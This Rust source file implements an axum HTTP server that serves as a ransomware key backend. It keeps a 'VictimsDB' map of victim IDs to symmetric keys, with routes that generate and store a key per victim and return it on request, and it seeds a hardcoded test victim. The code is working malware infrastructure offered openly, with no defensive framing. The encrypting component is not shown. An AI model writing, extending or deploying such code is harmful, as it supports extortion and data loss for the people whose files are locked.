mod cryptography;

use axum::{
    extract::{State},
    routing::{get, post},
    Json, Router, http::StatusCode
};
use serde_json::{Value};
use std::{collections::HashMap, sync::{Arc, Mutex}};

use tokio::net::TcpListener;

use cryptography::key_gen::{generate_sym_key};

type VictimsDB = Arc<Mutex<HashMap<String, [u8; 32]>>>;

async fn get_key(
    State(db): State<VictimsDB>,
    Json(id): Json<String>,
) -> Json<Value> {
    if let Some(value) = db.lock().unwrap().get(&id) {
        println!("Private key requested");
        return Json(serde_json::json!({"key": value}));
    }

    Json(serde_json::json!({"key": ""}))
}

async fn gen_key(
    State(db): State<VictimsDB>,
    Json(id): Json<String>,
) -> Result<Json<serde_json::Value>, StatusCode> {
    let key = generate_sym_key().map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    db.lock().unwrap().insert(id, key);

    println!("New keyset requested");
    return Ok(Json(serde_json::json!({"key": key})));
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let victims: VictimsDB = Arc::new(Mutex::new(HashMap::new()));
    victims.lock().unwrap().insert(String::from("123"), [5u8; 32]);

    let app: Router = Router::new()
                        .route("/get-key", get(get_key))
                        .route("/gen_key", post(gen_key))
                        .with_state(victims);

    // create a TCP listener (0.0.0.0:3000)
    let listener = TcpListener::bind("127.0.0.1:3000")
        .await
        .expect("failed to bind");

    // serve the app
    axum::serve(listener, app)
        .await
        .expect("server error");
        
    // let key = generate_sym_key()?;
    // println!("{:?}", key);

    Ok(())
}